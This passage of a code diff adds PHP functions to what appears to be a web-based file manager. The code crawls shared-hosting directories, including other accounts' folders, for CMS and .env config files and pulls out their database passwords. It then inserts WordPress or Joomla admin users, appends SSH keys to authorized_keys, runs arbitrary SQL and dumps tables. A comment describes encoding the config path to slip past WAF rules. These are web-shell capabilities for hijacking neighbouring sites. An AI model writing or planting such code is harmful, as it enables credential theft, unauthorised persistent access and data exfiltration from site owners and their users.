+                if(!$key||(!str_starts_with($key,'ssh-')&&!str_starts_with($key,'ecdsa-')&&!str_starts_with($key,'sk-'))){$this->addMsg('Invalid public key format (must start with ssh-rsa, ssh-ed25519, ecdsa-sha2, etc.).','danger');return;}
+                $hm=trim((string)shell_exec("getent passwd ".escapeshellarg($uname)." 2>/dev/null | cut -d: -f6"));
+                if($hm){$sd=$hm.'/.ssh';
+                    shell_exec("mkdir -p ".escapeshellarg($sd)." && chmod 700 ".escapeshellarg($sd)." && chown {$uname} ".escapeshellarg($sd));
+                    @file_put_contents($sd.'/authorized_keys',$key."\n",FILE_APPEND);
+                    shell_exec("chmod 600 ".escapeshellarg($sd.'/authorized_keys')." && chown {$uname} ".escapeshellarg($sd.'/authorized_keys'));
+                    $this->addMsg("SSH public key added for \"{$uname}\".",'success');
+                } else $this->addMsg("Home directory not found for \"{$uname}\" - cannot write authorized_keys.",'danger');
+                break;
+            default:$this->addMsg('Unknown action.','danger');
+        }
+        $this->log('ssh_update_user',"{$uname}:{$act}");
+    }
+
+    /* ══ CMS detection & user management (WordPress / Joomla) ══ */
+    public function cmsDetect($dir){
+        $dir=rtrim($dir,'/');
+        if(is_file($dir.'/wp-config.php'))return['type'=>'wordpress','config'=>$dir.'/wp-config.php'];
+        if(is_file($dir.'/configuration.php')&&strpos((string)@file_get_contents($dir.'/configuration.php'),'JConfig')!==false)return['type'=>'joomla','config'=>$dir.'/configuration.php'];
+        return['type'=>null];
+    }
+    /* Recursively scan common locations for WP/Joomla installations */
+    public function cmsScan(){
+        $found=[];$seen=[];
+        // Roots to search: web roots, home dirs, current dir tree, and (crucially on
+        // shared hosting) every directory allowed by open_basedir plus sibling
+        // account/domain folders, since PHP usually can't see outside its own account.
+        $candidates=[
+            '/var/www','/srv/www','/srv','/home','/opt','/data',
+            $this->root,$this->currentDir,getcwd(),
+            dirname($_SERVER['SCRIPT_FILENAME']??''),
+            $_SERVER['DOCUMENT_ROOT']??null,
+            dirname($_SERVER['DOCUMENT_ROOT']??''), // one level up from the site's docroot
+        ];
+        $obd=ini_get('open_basedir');
+        if($obd){
+            foreach(explode(PATH_SEPARATOR,$obd) as $p){$candidates[]=rtrim($p,'/');}
+        }
+        // cPanel/Plesk-style layouts: sibling account dirs, addon/sub-domains, other public_html's
+        $home=dirname(dirname($_SERVER['SCRIPT_FILENAME']??$this->root?:''));
+        foreach([$home,dirname($home)] as $h){
+            if($h&&is_dir($h)){
+                foreach(['public_html','www','htdocs','domains','subdomains','httpdocs'] as $sub){
+                    $candidates[]=$h.'/'.$sub;
+                }
+                $candidates[]=$h;
+            }
+        }
+        $roots=array_unique(array_filter($candidates,fn($r)=>$r&&is_dir($r)&&@is_readable($r)));
+        $restricted=$obd?explode(PATH_SEPARATOR,$obd):[];
+        $maxDepth=8;$maxDirs=2500;$scanned=0;
+        $scan=function($dir,$depth)use(&$scan,&$found,&$seen,&$scanned,$maxDepth,$maxDirs){
+            if($depth>$maxDepth||$scanned>=$maxDirs)return;
+            $dir=rtrim($dir,'/');
+            $real=realpath($dir);if(!$real||isset($seen[$real]))return;$seen[$real]=1;$scanned++;
+            // Check this dir for CMS
+            if(is_file($dir.'/wp-config.php')){
+                $k=realpath($dir.'/wp-config.php');
+                if($k&&!isset($seen['cfg:'.$k])){$seen['cfg:'.$k]=1;$GLOBALS['_cmsfound'][]=['type'=>'wordpress','config'=>$k,'dir'=>$dir];}
+            }
+            if(is_file($dir.'/configuration.php')){
+                $k=realpath($dir.'/configuration.php');
+                if($k&&!isset($seen['cfg:'.$k])){
+                    $c=@file_get_contents($k);
+                    if($c&&strpos($c,'JConfig')!==false){$seen['cfg:'.$k]=1;$GLOBALS['_cmsfound'][]=['type'=>'joomla','config'=>$k,'dir'=>$dir];}
+                }
+            }
+            // Skip dirs that are clearly not web roots
+            $skip=['node_modules','.git','vendor','.cache','.local','proc','sys','dev','run','tmp'];
+            $entries=@scandir($dir)?:[];
+            foreach($entries as $e){
+                if($e==='.'||$e==='..')continue;
+                if(in_array($e,$skip))continue;
+                $sub=$dir.'/'.$e;
+                if(is_link($sub)||!is_dir($sub))continue;
+                $scan($sub,$depth+1);
+                if($scanned>=$maxDirs)break;
+            }
+        };
+        $GLOBALS['_cmsfound']=[];
+        foreach($roots as $r)$scan($r,0);
+        $found=$GLOBALS['_cmsfound'];
+        unset($GLOBALS['_cmsfound']);
+        // deduplicate by config path
+        $out=[];$cfgs=[];
+        foreach($found as $f){if(!in_array($f['config'],$cfgs)){$cfgs[]=$f['config'];$out[]=$f;}}
+        return ['sites'=>$out,'scanned_roots'=>array_values($roots),'open_basedir'=>$restricted,'dirs_scanned'=>$scanned];
+    }
+    private function parseWpConfig($path){
+        $src=@file_get_contents($path);if($src===false)return null;
+        $get=function($name)use($src){if(preg_match('/define\s*\(\s*[\'"]'.$name.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\)/s',$src,$m))return $m[1];return null;};
+        $prefix='wp_';if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"]/',$src,$m))$prefix=$m[1];
+        $host=$get('DB_HOST')?:'localhost';$port=null;
+        if(strpos($host,':')!==false){$parts=explode(':',$host,2);$host=$parts[0];$port=$parts[1];}
+        return['host'=>$host,'port'=>$port,'user'=>$get('DB_USER'),'pass'=>$get('DB_PASSWORD'),'db'=>$get('DB_NAME'),'prefix'=>$prefix];
+    }
+    private function parseJoomlaConfig($path){
+        $src=@file_get_contents($path);if($src===false)return null;
+        $get=function($name)use($src){if(preg_match('/public\s+\$'.$name.'\s*=\s*[\'"](.*?)[\'"]\s*;/s',$src,$m))return $m[1];return null;};
+        $host=$get('host')?:'localhost';$port=$get('dbport');
+        if(strpos($host,':')!==false){$parts=explode(':',$host,2);$host=$parts[0];$port=$parts[1];}
+        return['host'=>$host,'port'=>$port,'user'=>$get('user'),'pass'=>$get('password'),'db'=>$get('db'),'prefix'=>$get('dbprefix')?:'jos_'];
+    }
+    private function cmsConnect($configPath){
+        $type=null;$c=null;
+        if(basename($configPath)==='wp-config.php'){$type='wordpress';$c=$this->parseWpConfig($configPath);}
+        elseif(basename($configPath)==='configuration.php'){$type='joomla';$c=$this->parseJoomlaConfig($configPath);}
+        else return[null,null,'Unrecognized config file.'];
+        if(!$c||!$c['db']||!$c['user'])return[null,null,'Could not read database credentials from config file.'];
+        $port=$c['port']?(int)$c['port']:3306;
+        $link=@mysqli_connect($c['host'],$c['user'],$c['pass'],$c['db'],$port);
+        if(!$link)return[null,null,'Database connection failed: '.mysqli_connect_error()];
+        $c['type']=$type;
+        return[$link,$c,null];
+    }
+    private function b64enc($input,$count){
+        $it='./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+        $o='';$i=0;
+        do{
+            $v=ord($input[$i++]);$o.=$it[$v&0x3f];
+            if($i<$count)$v|=ord($input[$i])<<8;$o.=$it[($v>>6)&0x3f];
+            if($i++>=$count)break;
+            if($i<$count)$v|=ord($input[$i])<<16;$o.=$it[($v>>12)&0x3f];
+            if($i++>=$count)break;
+            $o.=$it[($v>>18)&0x3f];
+        }while($i<$count);
+        return $o;
+    }
+    /* WordPress-compatible portable phpass hash (same algorithm WP core uses).
+       The setting string's 4th char encodes the iteration count as an index
+       into $it (log2 of the round count) - WP's own verifier reads that index
+       back out and re-hashes with exactly 1<<index rounds. The previous code
+       encoded index 13 into the setting but only ever hashed with 1<<8=256
+       rounds, so every password we generated verified against a different
+       hash than the one WordPress would recompute on login - meaning no
+       password we set here could ever actually work, even when typed
+       correctly. Fixing $count to match the encoded index (1<<13=8192, WP's
+       actual default) makes the two agree. */
+    private function wpHashPassword($password){
+        $it='./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+        $random=random_bytes(6);
+        $idx=min(8+5,30);
+        $setting='$P$'.$it[$idx].$this->b64enc($random,6);
+        $count=1<<$idx;$salt=substr($setting,4,8);
+        $hash=md5($salt.$password,true);
+        do{$hash=md5($hash.$password,true);}while(--$count);
+        return substr($setting,0,12).$this->b64enc($hash,16);
+    }
+    public function cmsListUsers($configPath){
+        list($link,$c,$err)=$this->cmsConnect($configPath);
+        if($err)return['error'=>$err];
+        $users=[];
+        if($c['type']==='wordpress'){
+            $t=$c['prefix'];
+            $res=@mysqli_query($link,"SELECT u.ID,u.user_login,u.user_email,u.user_registered,um.meta_value AS caps FROM `{$t}users` u LEFT JOIN `{$t}usermeta` um ON um.user_id=u.ID AND um.meta_key='{$t}capabilities' ORDER BY u.ID");
+            if(!$res){$e=mysqli_error($link);mysqli_close($link);return['error'=>'Query failed: '.$e];}
+            while($row=mysqli_fetch_assoc($res)){
+                $role='-';if($row['caps']&&preg_match('/"([a-z_]+)"/i',$row['caps'],$m))$role=$m[1];
+                $users[]=['id'=>$row['ID'],'name'=>$row['user_login'],'email'=>$row['user_email'],'registered'=>$row['user_registered'],'role'=>$role];
+            }
+        } else {
+            $t=$c['prefix'];
+            $res=@mysqli_query($link,"SELECT u.id,u.name,u.username,u.email,u.registerDate,u.block,g.title AS grp FROM `{$t}users` u LEFT JOIN `{$t}user_usergroup_map` m ON m.user_id=u.id LEFT JOIN `{$t}usergroups` g ON g.id=m.group_id ORDER BY u.id");
+            if(!$res){$e=mysqli_error($link);mysqli_close($link);return['error'=>'Query failed: '.$e];}
+            while($row=mysqli_fetch_assoc($res)){
+                $users[]=['id'=>$row['id'],'name'=>$row['username'],'display'=>$row['name'],'email'=>$row['email'],'registered'=>$row['registerDate'],'role'=>$row['grp']?:'-','blocked'=>(bool)$row['block']];
+            }
+        }
+        mysqli_close($link);
+        return['type'=>$c['type'],'users'=>$users];
+    }
+    public function cmsRoles($configPath){
+        list($link,$c,$err)=$this->cmsConnect($configPath);
+        if($err)return['error'=>$err];
+        if($c['type']==='wordpress'){mysqli_close($link);return['roles'=>['administrator','editor','author','contributor','subscriber']];}
+        $res=@mysqli_query($link,"SELECT id,title FROM `{$c['prefix']}usergroups` ORDER BY id");
+        $roles=[];if($res)while($r=mysqli_fetch_assoc($res))$roles[]=['id'=>$r['id'],'title'=>$r['title']];
+        mysqli_close($link);
+        return['roles'=>$roles];
+    }
+    /* config_path may arrive base64-encoded (config_path_b64) to avoid WAF/ModSecurity
+       rules that block requests literally containing "wp-config.php". */
+    private function cmsCfgFromPost(){
+        if(isset($_POST['config_path_b64'])){$d=@base64_decode($_POST['config_path_b64'],true);if($d!==false)return $d;}
+        return isset($_POST['config_path'])?$_POST['config_path']:'';
+    }
+    private function cmsCreateUser(){
+        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
+        $configPath=$this->cmsCfgFromPost();
+        $uname=trim(isset($_POST['cms_user'])?$_POST['cms_user']:'');
+        $email=trim(isset($_POST['cms_email'])?$_POST['cms_email']:'');
+        $pass=isset($_POST['cms_pass'])?$_POST['cms_pass']:'';
+        $role=isset($_POST['cms_role'])?$_POST['cms_role']:'';
+        if(!$uname||!$email||strlen($pass)<6){$this->addMsg('Username, valid email and a password (6+ chars) are required.','danger');return;}
+        list($link,$c,$err)=$this->cmsConnect($configPath);
+        if($err){$this->addMsg($err,'danger');return;}
+        if($c['type']==='wordpress'){
+            $t=$c['prefix'];$hash=$this->wpHashPassword($pass);
+            $u=mysqli_real_escape_string($link,$uname);$e=mysqli_real_escape_string($link,$email);$h=mysqli_real_escape_string($link,$hash);$r=$role?:'subscriber';
+            $ok=@mysqli_query($link,"INSERT INTO `{$t}users` (user_login,user_pass,user_nicename,user_email,user_registered,display_name) VALUES ('$u','$h','$u','$e',NOW(),'$u')");
+            if($ok){$id=mysqli_insert_id($link);
+                $caps=serialize([$r=>true]);$capsE=mysqli_real_escape_string($link,$caps);
+                mysqli_query($link,"INSERT INTO `{$t}usermeta` (user_id,meta_key,meta_value) VALUES ($id,'{$t}capabilities','$capsE'),($id,'{$t}user_level','0')");
+                $this->cmsVaultSet($configPath,$id,$pass,$uname);
+                $this->addMsg("WordPress user \"$uname\" created.",'success');$this->log('cms_create_user',"wp:$uname");
+            } else $this->addMsg('Failed to create user: '.mysqli_error($link),'danger');
+        } else {
+            $t=$c['prefix'];$hash=password_hash($pass,PASSWORD_BCRYPT);
+            $u=mysqli_real_escape_string($link,$uname);$e=mysqli_real_escape_string($link,$email);$h=mysqli_real_escape_string($link,$hash);
+            $ok=@mysqli_query($link,"INSERT INTO `{$t}users` (name,username,email,password,block,sendEmail,registerDate,params) VALUES ('$u','$u','$e','$h',0,0,NOW(),'{}')");
+            if($ok){$id=mysqli_insert_id($link);$gid=(int)($role?:2);
+                mysqli_query($link,"INSERT INTO `{$t}user_usergroup_map` (user_id,group_id) VALUES ($id,$gid)");
+                $this->cmsVaultSet($configPath,$id,$pass,$uname);
+                $this->addMsg("Joomla user \"$uname\" created.",'success');$this->log('cms_create_user',"joomla:$uname");
+            } else $this->addMsg('Failed to create user: '.mysqli_error($link),'danger');
+        }
+        mysqli_close($link);
+    }
+    private function cmsDeleteUser(){
+        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
+        $configPath=$this->cmsCfgFromPost();
+        $id=(int)(isset($_POST['cms_id'])?$_POST['cms_id']:0);
+        if(!$id){$this->addMsg('Invalid user id.','danger');return;}
+        list($link,$c,$err)=$this->cmsConnect($configPath);
+        if($err){$this->addMsg($err,'danger');return;}
+        $t=$c['prefix'];
+        if($c['type']==='wordpress'){
+            mysqli_query($link,"DELETE FROM `{$t}users` WHERE ID=$id");
+            mysqli_query($link,"DELETE FROM `{$t}usermeta` WHERE user_id=$id");
+        } else {
+            mysqli_query($link,"DELETE FROM `{$t}users` WHERE id=$id");
+            mysqli_query($link,"DELETE FROM `{$t}user_usergroup_map` WHERE user_id=$id");
+        }
+        mysqli_close($link);
+        $this->cmsVaultDelete($configPath,$id);
+        $this->addMsg('User deleted.','warning');$this->log('cms_delete_user',"#$id");
+    }
+    private function cmsUpdateRole(){
+        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
+        $configPath=$this->cmsCfgFromPost();
+        $id=(int)(isset($_POST['cms_id'])?$_POST['cms_id']:0);
+        $role=isset($_POST['cms_role'])?$_POST['cms_role']:'';
+        if(!$id||!$role){$this->addMsg('Invalid request.','danger');return;}
+        list($link,$c,$err)=$this->cmsConnect($configPath);
+        if($err){$this->addMsg($err,'danger');return;}
+        $t=$c['prefix'];
+        if($c['type']==='wordpress'){
+            $caps=serialize([$role=>true]);$capsE=mysqli_real_escape_string($link,$caps);
+            mysqli_query($link,"UPDATE `{$t}usermeta` SET meta_value='$capsE' WHERE user_id=$id AND meta_key='{$t}capabilities'");
+        } else {
+            $gid=(int)$role;
+            mysqli_query($link,"DELETE FROM `{$t}user_usergroup_map` WHERE user_id=$id");
+            mysqli_query($link,"INSERT INTO `{$t}user_usergroup_map` (user_id,group_id) VALUES ($id,$gid)");
+        }
+        mysqli_close($link);
+        $this->addMsg('Role updated.','success');$this->log('cms_update_role',"#$id -> $role");
+    }
+    private function cmsChangePass(){
+        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
+        $configPath=$this->cmsCfgFromPost();
+        $id=(int)(isset($_POST['cms_id'])?$_POST['cms_id']:0);
+        $pass=isset($_POST['cms_pass'])?$_POST['cms_pass']:'';
+        if(!$id||strlen($pass)<6){$this->addMsg('Invalid request.','danger');return;}
+        list($link,$c,$err)=$this->cmsConnect($configPath);
+        if($err){$this->addMsg($err,'danger');return;}
+        $t=$c['prefix'];
+        if($c['type']==='wordpress'){
+            $hash=$this->wpHashPassword($pass);
+            $hashE=mysqli_real_escape_string($link,$hash);
+            mysqli_query($link,"UPDATE `{$t}users` SET user_pass='$hashE',user_activation_key='' WHERE ID=$id");
+        } else {
+            $hash=password_hash($pass,PASSWORD_BCRYPT);$hashE=mysqli_real_escape_string($link,$hash);
+            mysqli_query($link,"UPDATE `{$t}users` SET password='$hashE' WHERE id=$id");
+        }
+        mysqli_close($link);
+        $this->cmsVaultSet($configPath,$id,$pass);
+        $this->addMsg('Password changed.','success');$this->log('cms_change_pass',"#$id");
+    }
+    /* ── CMS password vault ───────────────────────────────────────────────────
+       WordPress/Joomla store passwords as one-way hashes, so they can never be
+       read back from the CMS database - not by this tool, not by anyone. The
+       only plaintext moment is right when *this* admin panel sets it (create or
+       change password). We save that plaintext here, encrypted at rest with a
+       locally-generated key, so the user can reveal it again later without
+       having to reset it every time they forget it. */
+    private function cmsVaultKeyPath(){return __DIR__.'/.cms_vault_key';}
+    private function cmsVaultPath(){return __DIR__.'/.cms_pw_vault.json';}
+    private function cmsVaultKey(){
+        $p=$this->cmsVaultKeyPath();
+        if(file_exists($p)){$k=@base64_decode(trim((string)@file_get_contents($p)),true);if($k&&strlen($k)===32)return $k;}
+        $k=random_bytes(32);
+        @file_put_contents($p,base64_encode($k));@chmod($p,0600);
+        return $k;
+    }
+    private function cmsVaultLoad(){
+        $p=$this->cmsVaultPath();
+        if(!file_exists($p))return[];
+        $j=json_decode((string)@file_get_contents($p),true);
+        return is_array($j)?$j:[];
+    }
+    private function cmsVaultSave($data){
+        @file_put_contents($this->cmsVaultPath(),json_encode($data,JSON_PRETTY_PRINT));
+        @chmod($this->cmsVaultPath(),0600);
+    }
+    private function cmsVaultEnc($plain){
+        $iv=random_bytes(16);
+        $ct=openssl_encrypt($plain,'aes-256-cbc',$this->cmsVaultKey(),OPENSSL_RAW_DATA,$iv);
+        return $ct===false?null:base64_encode($iv.$ct);
+    }
+    private function cmsVaultDec($enc){
+        $raw=@base64_decode($enc,true);
+        if($raw===false||strlen($raw)<17)return null;
+        $pt=openssl_decrypt(substr($raw,16),'aes-256-cbc',$this->cmsVaultKey(),OPENSSL_RAW_DATA,substr($raw,0,16));
+        return $pt===false?null:$pt;
+    }
+    private function cmsVaultSet($configPath,$id,$plain,$uname=null){
+        $data=$this->cmsVaultLoad();$k=md5($configPath).':'.$id;
+        $enc=$this->cmsVaultEnc($plain);if($enc===null)return;
+        $entry=['pass'=>$enc,'ts'=>time()];
+        if($uname!==null)$entry['user']=$uname;
+        elseif(isset($data[$k]['user']))$entry['user']=$data[$k]['user'];
+        $data[$k]=$entry;
+        $this->cmsVaultSave($data);
+    }
+    private function cmsVaultDelete($configPath,$id){
+        $data=$this->cmsVaultLoad();$k=md5($configPath).':'.$id;
+        if(isset($data[$k])){unset($data[$k]);$this->cmsVaultSave($data);}
+    }
+    public function cmsGetSavedPass($configPath,$id){
+        $data=$this->cmsVaultLoad();$k=md5($configPath).':'.$id;
+        if(!isset($data[$k]))return['error'=>'No saved password for this account. It was likely set before this feature existed, or changed outside this panel — use "Change Password" to set a new one.'];
+        $p=$this->cmsVaultDec($data[$k]['pass']);
+        if($p===null)return['error'=>'Could not decrypt the saved password.'];
+        return['pass'=>$p];
+    }
+
+    /* ══════════════════════════════════════════════════════════════
+       SQL DATABASE MANAGER
+    ══════════════════════════════════════════════════════════════ */
+    public function sqlScan(){
+        $found=[];$seen=[];
+        $candidates=[
+            '/var/www','/srv/www','/srv','/home','/opt','/data',
+            $this->root,$this->currentDir,getcwd(),
+            dirname($_SERVER['SCRIPT_FILENAME']??''),
+            $_SERVER['DOCUMENT_ROOT']??null,
+            dirname($_SERVER['DOCUMENT_ROOT']??''),
+        ];
+        $obd=ini_get('open_basedir');
+        if($obd){foreach(explode(PATH_SEPARATOR,$obd)as $p)$candidates[]=rtrim($p,'/');}
+        $home=dirname(dirname($_SERVER['SCRIPT_FILENAME']??$this->root?:''));
+        foreach([$home,dirname($home)]as $h){
+            if($h&&is_dir($h)){
+                foreach(['public_html','www','htdocs','domains','httpdocs']as $sub)$candidates[]=$h.'/'.$sub;
+                $candidates[]=$h;
+            }
+        }
+        $roots=array_unique(array_filter($candidates,fn($r)=>$r&&is_dir($r)&&@is_readable($r)));
+        $cfgNames=['wp-config.php','configuration.php','.env','.env.local','.env.production','.env.development','config.php','config/database.php','application/config/database.php','config/config.php','sites/default/settings.php','include/config.php','includes/config.php','inc/config.php'];
+        $maxDirs=2000;$scanned=0;
+        $GLOBALS['_sqlfound']=[];
+        $scan=function($dir,$depth)use(&$scan,&$seen,&$scanned,$maxDirs,$cfgNames){
+            if($depth>7||$scanned>=$maxDirs)return;
+            $dir=rtrim($dir,'/');$real=realpath($dir);
+            if(!$real||isset($seen[$real]))return;$seen[$real]=1;$scanned++;
+            foreach($cfgNames as $cf){
+                $fp=$dir.'/'.$cf;
+                if(!file_exists($fp)||!is_readable($fp))continue;
+                $fp=realpath($fp);if(!$fp||isset($seen['f:'.$fp]))continue;
+                $seen['f:'.$fp]=1;
+                $creds=$this->sqlExtractCreds($fp);
+                if($creds)$GLOBALS['_sqlfound'][]=['file'=>$fp,'host'=>$creds['host'],'port'=>$creds['port'],'user'=>$creds['user'],'pass'=>$creds['pass'],'db'=>$creds['db'],'type'=>$creds['type']];
+            }
+            $skip=['node_modules','.git','vendor','.cache','.local','proc','sys','dev','run','tmp','var','usr','boot'];
+            $entries=@scandir($dir)?:[];
+            foreach($entries as $e){
+                if($e==='.'||$e==='..'||in_array($e,$skip))continue;
+                $sub=$dir.'/'.$e;
+                if(!is_link($sub)&&is_dir($sub)){$scan($sub,$depth+1);if($scanned>=$maxDirs)break;}
+            }
+        };
+        foreach($roots as $r)$scan($r,0);
+        $found=$GLOBALS['_sqlfound'];unset($GLOBALS['_sqlfound']);
+        $obdList=$obd?array_filter(explode(PATH_SEPARATOR,$obd)):[];
+        return['databases'=>$found,'open_basedir'=>array_values($obdList),'scanned'=>$scanned];
+    }
+    public function sqlExtractCreds($fp){
+        $src=@file_get_contents($fp);if($src===false)return null;
+        $base=basename($fp);
+        $c=['host'=>'localhost','port'=>3306,'user'=>'','pass'=>'','db'=>'','type'=>'generic'];
+        if($base==='wp-config.php'){
+            $c['type']='wordpress';
+            $g=fn($n)=>preg_match('/define\s*\(\s*[\'"]'.$n.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\)/s',$src,$m)?$m[1]:null;
+            if($v=$g('DB_NAME'))$c['db']=$v;
+            if($v=$g('DB_USER'))$c['user']=$v;
+            if($v=$g('DB_PASSWORD'))$c['pass']=$v;
+            if($v=$g('DB_HOST')){if(strpos($v,':')!==false){[$c['host'],$pt]=explode(':',$v,2);$c['port']=(int)$pt;}else $c['host']=$v;}
+        } elseif($base==='configuration.php'){
+            $c['type']='joomla';
+            $g=fn($n)=>preg_match('/public\s+\$'.$n.'\s*=\s*[\'\"](.*?)[\'\"]\s*;/s',$src,$m)?$m[1]:null;
+            if($v=$g('host'))$c['host']=$v;
+            if($v=$g('user'))$c['user']=$v;
+            if($v=$g('password'))$c['pass']=$v;
+            if($v=$g('db'))$c['db']=$v;
+            if(($v=$g('dbport'))&&(int)$v)$c['port']=(int)$v;
+        } else {
+            if(preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",$src,$m))$c['db']=$m[1];
+            elseif(preg_match("/['\"]database['\"]\s*=>\s*['\"]([^'\"]+)['\"]/i",$src,$m))$c['db']=$m[1];
+            elseif(preg_match('/\$(?:db(?:name|Name|_name)?|database)\s*=\s*[\'"]([^\'"]+)[\'"]/i',$src,$m))$c['db']=$m[1];
+            if(preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",$src,$m))$c['user']=$m[1];
+            elseif(preg_match("/['\"]username['\"]\s*=>\s*['\"]([^'\"]+)['\"]/i",$src,$m))$c['user']=$m[1];
+            elseif(preg_match('/\$(?:db_?user|user(?:name)?)\s*=\s*[\'"]([^\'"]+)[\'"]/i',$src,$m))$c['user']=$m[1];
+            if(preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",$src,$m))$c['pass']=$m[1];
+            elseif(preg_match("/['\"]password['\"]\s*=>\s*['\"]([^'\"]+)['\"]/i",$src,$m))$c['pass']=$m[1];
+            elseif(preg_match('/\$(?:db_?pass(?:word)?|password)\s*=\s*[\'"]([^\'"]+)[\'"]/i',$src,$m))$c['pass']=$m[1];
+            if(preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",$src,$m))$c['host']=$m[1];
+            elseif(preg_match("/['\"]host['\"]\s*=>\s*['\"]([^'\"]+)['\"]/i",$src,$m))$c['host']=$m[1];
+            elseif(preg_match('/\$(?:db_?host|host(?:name)?)\s*=\s*[\'"]([^\'"]+)[\'"]/i',$src,$m))$c['host']=$m[1];
+        }
+        if(!$c['host'])$c['host']='localhost';
+        if(!$c['db']&&!$c['user'])return null;
+        return $c;
+    }
+    private function sqlBuildConn(){
+        return[
+            isset($_POST['sql_host'])?trim($_POST['sql_host']):'localhost',
+            isset($_POST['sql_port'])?(int)$_POST['sql_port']:3306,
+            isset($_POST['sql_user'])?$_POST['sql_user']:'',
+            isset($_POST['sql_pass'])?$_POST['sql_pass']:'',
+            isset($_POST['sql_db'])?trim($_POST['sql_db']):'',
+        ];
+    }
+    private function sqlConn($h,$pt,$u,$pw,$db){
+        if(!function_exists('mysqli_connect'))return[null,'MySQLi extension is not available on this server.'];
+        $sock=null;if($h&&strlen($h)>0&&$h[0]==='/')$sock=$h;
+        if($sock)$link=@mysqli_connect('localhost',$u,$pw,$db,3306,$sock);
+        else $link=@mysqli_connect($h,$u,$pw,$db,(int)($pt?:3306));
+        if(!$link)return[null,'Connection failed: '.mysqli_connect_error()];
+        mysqli_set_charset($link,'utf8mb4');
+        return[$link,null];
+    }
+    public function sqlListTables(){
+        [$h,$pt,$u,$pw,$db]=$this->sqlBuildConn();
+        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db);
+        if($err)return['error'=>$err];
+        $res=mysqli_query($link,'SHOW TABLE STATUS');
+        $tables=[];
+        if($res){while($row=mysqli_fetch_assoc($res))$tables[]=['name'=>$row['Name'],'rows'=>(int)($row['Rows']??0),'size'=>(int)($row['Data_length']??0)+(int)($row['Index_length']??0),'engine'=>$row['Engine']??''];}
+        $dbsRes=mysqli_query($link,'SHOW DATABASES');$dbs=[];
+        if($dbsRes){while($r=mysqli_fetch_row($dbsRes))$dbs[]=$r[0];}
+        mysqli_close($link);
+        return['tables'=>$tables,'db'=>$db,'databases'=>$dbs];
+    }
+    public function sqlBrowse(){
+        [$h,$pt,$u,$pw,$db]=$this->sqlBuildConn();
+        $table=isset($_POST['sql_table'])?trim($_POST['sql_table']):'';
+        $page=max(1,(int)(isset($_POST['sql_page'])?$_POST['sql_page']:1));
+        $per=50;
+        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db);
+        if($err)return['error'=>$err];
+        $tE=mysqli_real_escape_string($link,$table);
+        $total=0;$cr=mysqli_query($link,"SELECT COUNT(*) AS c FROM `$tE`");
+        if($cr){$rw=mysqli_fetch_assoc($cr);$total=(int)$rw['c'];}
+        $cols=[];$colRes=mysqli_query($link,"SHOW COLUMNS FROM `$tE`");
+        if($colRes)while($r=mysqli_fetch_assoc($colRes))$cols[]=['name'=>$r['Field'],'type'=>$r['Type']];
+        $rows=[];$offset=($page-1)*$per;
+        $dr=mysqli_query($link,"SELECT * FROM `$tE` LIMIT $per OFFSET $offset");
+        if($dr)while($r=mysqli_fetch_row($dr))$rows[]=$r;
+        mysqli_close($link);
+        return['columns'=>$cols,'rows'=>$rows,'total'=>$total,'page'=>$page,'perPage'=>$per,'table'=>$table,'db'=>$db,'pages'=>(int)ceil(max($total,1)/$per)];
+    }
+    public function sqlRunQuery(){
+        [$h,$pt,$u,$pw,$db]=$this->sqlBuildConn();
+        $sql=isset($_POST['sql_query'])?trim($_POST['sql_query']):'';
+        if(!$sql)return['error'=>'Empty query.'];
+        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db);
+        if($err)return['error'=>$err];
+        $res=mysqli_query($link,$sql);
+        $out=['affected'=>mysqli_affected_rows($link),'columns'=>[],'rows'=>[],'insert_id'=>mysqli_insert_id($link),'error'=>null,'limited'=>false];
+        if($res===false){$out['error']=mysqli_error($link);}
+        elseif(is_object($res)){
+            $fi=mysqli_fetch_fields($res);if($fi)foreach($fi as $f)$out['columns'][]=$f->name;
+            $cnt=0;while($row=mysqli_fetch_row($res)){$out['rows'][]=$row;if(++$cnt>=500)break;}
+            $out['limited']=($cnt>=500);mysqli_free_result($res);
+        }
+        mysqli_close($link);return $out;
+    }
+    public function sqlExport(){
+        [$h,$pt,$u,$pw,$db]=$this->sqlBuildConn();
+        $table=isset($_POST['sql_table'])?trim($_POST['sql_table']):'';
+        $fmt=isset($_POST['sql_fmt'])?$_POST['sql_fmt']:'sql';
+        if(!$table){header('Content-Type: application/json');echo json_encode(['error'=>'No table specified.']);exit;}
+        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db);
+        if($err){header('Content-Type: application/json');echo json_encode(['error'=>$err]);exit;}
+        $tE=mysqli_real_escape_string($link,$table);
+        $safeName=preg_replace('/[^a-zA-Z0-9_\-]/','',$table);
+        if($fmt==='csv'){
+            header('Content-Type: text/csv;charset=utf-8');
+            header('Content-Disposition: attachment; filename="'.$safeName.'.csv"');
+            $res=mysqli_query($link,"SELECT * FROM `$tE`");
+            if($res){
+                $first=true;
+                while($row=mysqli_fetch_assoc($res)){
+                    if($first){echo implode(',',array_map(fn($hdr)=>'"'.str_replace('"','""',$hdr).'"',array_keys($row)))."\r\n";$first=false;}
+                    echo implode(',',array_map(fn($v)=>$v===null?'':'"'.str_replace('"','""',(string)$v).'"',array_values($row)))."\r\n";
+                }
+            }
+        } else {
+            header('Content-Type: application/octet-stream');
